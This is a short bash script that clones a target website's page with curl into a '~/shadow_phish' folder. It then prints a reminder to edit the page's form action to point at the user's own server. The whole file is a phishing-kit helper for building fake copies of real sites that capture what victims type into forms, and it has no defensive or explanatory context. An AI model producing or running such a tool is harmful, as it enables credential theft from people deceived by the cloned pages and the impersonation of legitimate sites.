#!/bin/bash
TARGET=$1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
mkdir -p ~/shadow_phish
curl -sk --max-time 10 "$TARGET" -o ~/shadow_phish/index.html 2>/dev/null
echo "[PHISH] Page saved: ~/shadow_phish/index.html"
echo "[PHISH] Edit the form action to your server"
